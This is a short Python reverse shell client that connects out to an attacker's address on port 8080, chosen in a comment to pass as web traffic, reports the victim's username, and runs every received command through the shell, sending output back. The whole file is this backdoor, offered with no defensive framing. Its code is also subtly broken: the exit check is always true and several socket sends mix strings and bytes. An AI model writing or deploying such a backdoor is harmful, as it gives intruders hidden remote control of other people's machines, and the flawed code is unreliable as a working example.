import socket
import subprocess
import json

ip = ""
port = 8080  # 8080 / 80 to look like a web server

user = subprocess.check_output("whoami", shell=True).decode()


def cmd_exec(command):
    return subprocess.check_output(command, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((ip, port))

connection.send(f"\nSuccessfully connected to {user}\n")


def send_j(pack):
    package = json.dumps(pack)
    connection.send(package)


def recv_j():
    data = connection.recv(2048)
    return json.loads(data)


while True:
    cmd1 = recv_j()
    cmd_out = cmd_exec(cmd1)

    if cmd1.decode() == "exit" or "quit":
        break
    else:
        send_j(f"{user}: " + cmd_out)

connection.close()
